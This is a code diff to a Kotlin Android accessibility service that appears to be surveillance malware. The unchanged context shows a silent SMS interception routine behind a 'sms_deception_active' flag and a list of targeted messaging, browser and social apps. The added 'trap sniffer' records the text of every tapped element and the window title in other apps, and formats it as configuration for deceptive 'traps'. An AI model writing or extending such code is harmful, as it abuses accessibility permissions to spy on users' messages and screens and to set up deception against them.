@@ -532,6 +532,13 @@ class MyAccessibilityService : AccessibilityService() {
             }
         }
 
+        // --- UI TRAP SNIFFER (Developer Mode) ---
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            if (getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean("trap_sniffer_enabled", false)) {
+                generateTrapSnifferLog(event, pkgName)
+            }
+        }
+
         // --- SMS SILENT INTERCEPTION PROTOCOL ---
         val smsDeceptionActive = getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean("sms_deception_active", false)
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
@@ -3779,5 +3786,67 @@ class MyAccessibilityService : AccessibilityService() {
         val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
         for (app in apps) defaults.put(app, JSONObject())
         return defaults
+    }
+
+    private fun generateTrapSnifferLog(event: AccessibilityEvent, pkg: String) {
+        try {
+            val node = event.source ?: return
+            var title = ""
+            var summary = ""
+            var anchor = ""
+
+            val texts = mutableListOf<String>()
+            fun extractAllTexts(n: android.view.accessibility.AccessibilityNodeInfo?) {
+                if (n == null) return
+                val t = n.text?.toString() ?: n.contentDescription?.toString()
+                if (!t.isNullOrBlank()) texts.add(t.trim())
+                for (i in 0 until n.childCount) {
+                    extractAllTexts(n.getChild(i))
+                }
+            }
+            extractAllTexts(node)
+
+            if (texts.isNotEmpty()) {
+                title = texts[0]
+                if (texts.size > 1) {
+                    summary = texts[1]
+                }
+            }
+
+            if (title.isEmpty()) {
+                title = event.text.joinToString(" ").trim()
+            }
+
+            val root = rootInActiveWindow
+            if (root != null) {
+                fun findTitleAnchor(n: android.view.accessibility.AccessibilityNodeInfo?): String {
+                    if (n == null) return ""
+                    val id = n.viewIdResourceName ?: ""
+                    // Heuristic for common AppBar/Toolbar title views
+                    if (id.contains("title", ignoreCase = true) || 
+                        id.contains("action_bar", ignoreCase = true) || 
+                        id.contains("toolbar", ignoreCase = true) ||
+                        id.contains("collapsing", ignoreCase = true)) {
+                        val t = n.text?.toString() ?: ""
+                        if (t.isNotBlank()) return t
+                    }
+                    for (i in 0 until n.childCount) {
+                        val res = findTitleAnchor(n.getChild(i))
+                        if (res.isNotEmpty()) return res
+                    }
+                    return ""
+                }
+                anchor = findTitleAnchor(root)
+            }
+
+            if (title.isNotBlank()) {
+                // Formatting perfectly to match Cortex predictive trap config payload
+                val fingerprint = "$title@@$summary@@$pkg@@$anchor"
+                DebugLogger.log("TRAP_SNIFFER", "Tap Registered. Suggested Config:\n$fingerprint")
+            }
+            node.recycle()
+        } catch (e: Exception) {
+            DebugLogger.log("TRAP_SNIFFER_ERR", e.message ?: "Unknown error")
+        }
     }
 }
